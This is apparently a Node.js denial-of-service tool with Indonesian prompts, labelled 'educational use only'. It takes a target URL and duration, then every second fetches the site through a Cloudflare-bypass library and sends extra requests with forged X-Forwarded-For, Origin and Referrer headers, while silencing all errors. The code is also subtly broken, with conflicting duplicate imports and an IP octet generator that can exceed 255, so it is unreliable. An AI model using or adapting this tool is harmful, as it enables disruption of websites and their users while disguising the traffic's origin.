import readline from 'readline';
import cloudscraper from 'cloudscraper';
import request from 'request';
import randomstring from 'randomstring';
const cloudscraper = require('cloudscraper');
const request = require('request');
const randomstring = require('randomstring');
const readline = require('readline');
const ora = require('ora');

function randomByte() {
    return Math.round(Math.random() * 0x100);
}

const rl = readline.createInterface({
    input: process.stdin,
    output: process.stdout
});

function ask(question) {
    return new Promise(resolve => rl.question(question, resolve));
}

(async () => {
    console.clear();
    console.log("💥 DDoS Panel - EDUCATIONAL USE ONLY 💥\n");

    const url = await ask("🌐 Masukkan URL target: ");
    const time = parseInt(await ask("⏱️ Durasi serangan (detik): "), 10);

    if (!url || isNaN(time)) {
        console.log("❌ Input tidak valid!");
        rl.close();
        return;
    }

    const spinner = ora(`🚀 Memulai serangan ke ${url} selama ${time} detik...`).start();

    const int = setInterval(() => {
        let cookieValue = 'cookie';
        let userAgent = 'User-Agent';

        cloudscraper.get(url, function (error, response, body) {
            if (error) {
                spinner.warn("⚠️ Error terjadi saat mengakses target!");
            } else {
                const parsedResponse = JSON.parse(JSON.stringify(response));
                cookieValue = parsedResponse.request.headers.cookie;
                userAgent = parsedResponse.request.headers['User-Agent'];
            }

            const randomSubdomain = randomstring.generate({
                length: 10,
                charset: 'ASDFGHJKLZXCVBNMQWERTYUIOPasdfghjklzxcvbnmqwertyuiop1234567890'
            });

            const spoofedIP =
                randomByte() + '.' +
                randomByte() + '.' +
                randomByte() + '.' +
                randomByte();

            const options = {
                url: url,
                headers: {
                    'User-Agent': userAgent,
                    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
                    'Upgrade-Insecure-Requests': '2000',
                    'cookie': cookieValue,
                    'Origin': 'http://' + randomSubdomain + '.com',
                    'Referrer': 'http://google.com/' + randomSubdomain,
                    'X-Forwarded-For': spoofedIP
                }
            };

            request(options);
        });
    }, 1000);

    setTimeout(() => {
        clearInterval(int);
        spinner.succeed("✅ Serangan selesai!");
        rl.close();
    }, time * 1000);

    process.on('unhandledRejection', function () {});
    process.on('uncaughtException', function () {});
})();
